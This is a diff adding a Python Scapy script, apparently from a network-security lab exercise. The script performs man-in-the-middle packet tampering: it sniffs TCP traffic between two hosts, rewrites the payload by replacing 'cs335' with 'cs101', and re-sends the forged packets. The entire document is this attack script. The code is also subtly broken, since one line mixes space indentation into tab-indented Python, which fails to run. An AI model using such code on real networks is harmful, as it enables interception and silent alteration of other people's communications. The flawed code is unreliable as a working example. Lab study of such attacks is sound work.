@@ -1,0 +1,28 @@
+#!/usr/bin/env python3
+from scapy.all import *
+
+host_a = "10.9.0.5"
+host_b = "10.9.0.6"
+
+def spoof_pkt(pkt):
+	if pkt[IP].src == host_a and pkt[IP].dst == host_b:
+
+		newpkt = IP(bytes(pkt[IP]))
+		del(newpkt.chksum)
+		del(newpkt[TCP].payload)
+		del(newpkt[TCP].chksum)
+
+		if pkt[TCP].payload:
+			data = pkt[TCP].payload.load
+			newdata = data.replace(b'cs335', b'cs101')
+            print(newdata)
+			send(newpkt/newdata, verbose=0)
+		else:
+			send(newpkt, verbose=0)
+	elif pkt[IP].src == host_b and pkt[IP].dst == host_a:
+		newpkt = IP(bytes(pkt[IP]))
+		del(newpkt.chksum)
+		del(newpkt[TCP].chksum)
+		send(newpkt, verbose=0)
+
+pkt = sniff(iface='eth0', filter='tcp', prn=spoof_pkt)
